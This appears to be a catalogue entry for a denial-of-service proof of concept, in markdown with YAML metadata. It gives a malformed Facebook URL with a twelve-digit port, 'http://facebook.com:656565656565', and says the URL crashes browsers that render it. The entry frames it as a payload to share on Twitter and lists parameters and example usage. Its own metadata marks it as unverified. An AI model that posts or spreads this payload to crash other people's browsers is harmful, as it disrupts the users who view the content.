---
data: 'http://facebook.com:656565656565'
tags:
  - dos
  - poc
type: command
output: Browser crash
executor: text
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:56.161Z'
id: 202cd4fd-7c41-4a4c-abf1-e3efc3772d38
verified: false
validated: true
submitted: true
---
# malformed-facebook-url-poc

## Command

```text
http://facebook.com:656565656565
```

## Description

Payload with 12-digit port to illustrate exploit generality in Twitter-shared content.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| port | Long port (e.g., 656565656565) | Yes |
| domain | Domain like facebook.com | Yes |

## Examples

### Basic Usage

```text
http://facebook.com:656565656565
```

## Expected Output

Triggers DoS on rendering.

## Related

- [[Related Procedure]]
